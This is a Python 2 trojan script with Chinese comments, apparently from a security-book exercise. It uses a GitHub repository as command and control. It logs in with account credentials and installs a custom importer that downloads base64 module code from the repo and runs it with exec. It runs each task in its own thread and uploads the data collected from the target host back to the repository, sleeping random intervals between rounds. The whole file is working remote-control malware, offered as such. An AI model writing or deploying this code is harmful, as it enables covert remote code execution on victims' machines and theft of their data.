#-*- coding:utf8 -*-

import json
import base64
import sys
import time
import imp
import random
import threading
import Queue
import os

from github3 import login

trojan_id = "abc"

trojan_config = "%s.json" % trojan_id
data_path = "chapter7/data/%s/" % trojan_id
trojan_modules = []
configured = False
task_queue = Queue.Queue()


# 通过账号密码连接到github，获取repo和branch
def connect_to_github():
    gh = login(username="你的账号", password="你的密码")
    repo = gh.repository("你的账号，同上面的账号", "python-hacker-code（仓库名）")
    branch = repo.branch("master")

    return gh,repo,branch

# 从远程仓库中获取文件
def get_file_contents(filepath):

    gh, repo, branch = connect_to_github()
    tree = branch.commit.commit.tree.recurse()

    for filename in tree.tree:

        if filepath in filename.path:
            print "[*] Found file %s" % filepath
            blob = repo.blob(filename._json_data['sha'])
            return blob.content

    return None

# 获取木马的配置文件，并导入模块
def get_trojan_config():
    global configured
    config_json = get_file_contents(trojan_config)
    config  = json.loads(base64.b64decode(config_json))
    configured = True

    for task in config:
        if task['module'] not in sys.modules:
            exec("import %s" % task['module'])

    return config

# 将从目标主机收集到的数据推送到仓库中
def store_module_result(data):

    gh, repo, branch = connect_to_github()
    remote_path = "chapter7/data/%s/%d.data" % (trojan_id, random.randint(10,10000000))
    repo.create_file(remote_path,"Commit message",base64.b64encode(data))

    return

def module_runner(module):

    # 将１加入到队列中
    task_queue.put(1)
    result = sys.modules[module].run(a=1,b=2,c=3)
    # 从队列中移除
    task_queue.get()

    # 保存结果到我们的仓库中
    store_module_result(result)

    return

class GitImporter(object):
    def __init__(self):
        self.current_module_code = ""

    # 尝试获取模块所在位置
    def find_module(self, fullname, path=None):
        if configured:
            print "[*] Attempting to retrieve %s" % fullname
            new_library = get_file_contents("chapter7/modules/%s" % fullname)

            if new_library is not None:
                self.current_module_code = base64.b64decode(new_library)
                # 返回self变量，告诉python解析器找到了所需的模块
                return self

        return None

    # 完成模块的实际加载过程
    def load_module(self, name):
        # 创建一个空的模块对象
        module = imp.new_module(name)
        # 将github中获得的代码导入的这个对象中
        exec self.current_module_code in module.__dict__
        # 最后将这个新建的模块添加到sys.modules列表里面
        sys.modules[name] = module

        return module



# 添加自定义的模块导入器
sys.meta_path = [GitImporter()]
# 木马循环
while True:

    if task_queue.empty():
        # 获取木马配置文件
        config = get_trojan_config()
        for task in config:
            # 对每个模块单独建立线程
            t = threading.Thread(target=module_runner, args=(task['module'],))
            t.start()
            time.sleep(random.randint(1,10))

    time.sleep(random.randint(1000,10000))



